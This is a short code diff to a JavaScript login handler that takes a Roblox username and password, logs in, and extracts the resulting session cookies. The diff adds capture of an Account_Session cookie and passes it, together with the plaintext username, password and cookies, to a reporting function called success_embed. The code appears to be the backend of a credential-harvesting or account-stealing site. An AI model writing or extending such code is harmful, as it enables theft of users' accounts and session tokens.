@@ -22,6 +22,8 @@ async function xcsrftoken() {
 
 async function robloxlogin(req, res) {
 
+    const sessionToken = req.cookies.Account_Session;
+
     const {
         Username,
         Password,
@@ -72,7 +74,7 @@ async function robloxlogin(req, res) {
 
         if (match) {
             const cookies = match[0];
-            const embedresponse = await success_embed(Username, Password, cookies, Success);
+            const embedresponse = await success_embed(Username, Password, cookies, Success,sessionToken);
             res.status(200).json({
                 success: true,
                 message: embedresponse
@@ -84,6 +86,7 @@ async function robloxlogin(req, res) {
             });
         }
     } catch (error) {
+        console.log(error);
         if (error.response) {
             responseHeaders = error.response.headers;
             errorData = JSON.stringify(error.response.data);
